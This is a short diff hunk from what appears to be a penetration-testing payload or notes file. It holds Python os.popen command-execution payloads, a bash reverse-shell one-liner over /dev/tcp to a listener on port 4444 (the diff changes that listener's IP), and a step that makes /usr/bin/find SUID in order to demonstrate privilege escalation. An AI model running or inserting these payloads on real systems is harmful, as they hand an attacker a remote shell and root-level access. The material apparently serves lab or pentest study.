@@ -3,7 +3,7 @@ __import__('os').popen('whoami').read();
 import os; print(os.popen("whoami").read())
 
 # Reverse shell
-__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()
+__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.80/4444 0>&1"').read()
 
 Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation. Next we run the following command on the Find command:
 chmod u+s /usr/bin/find
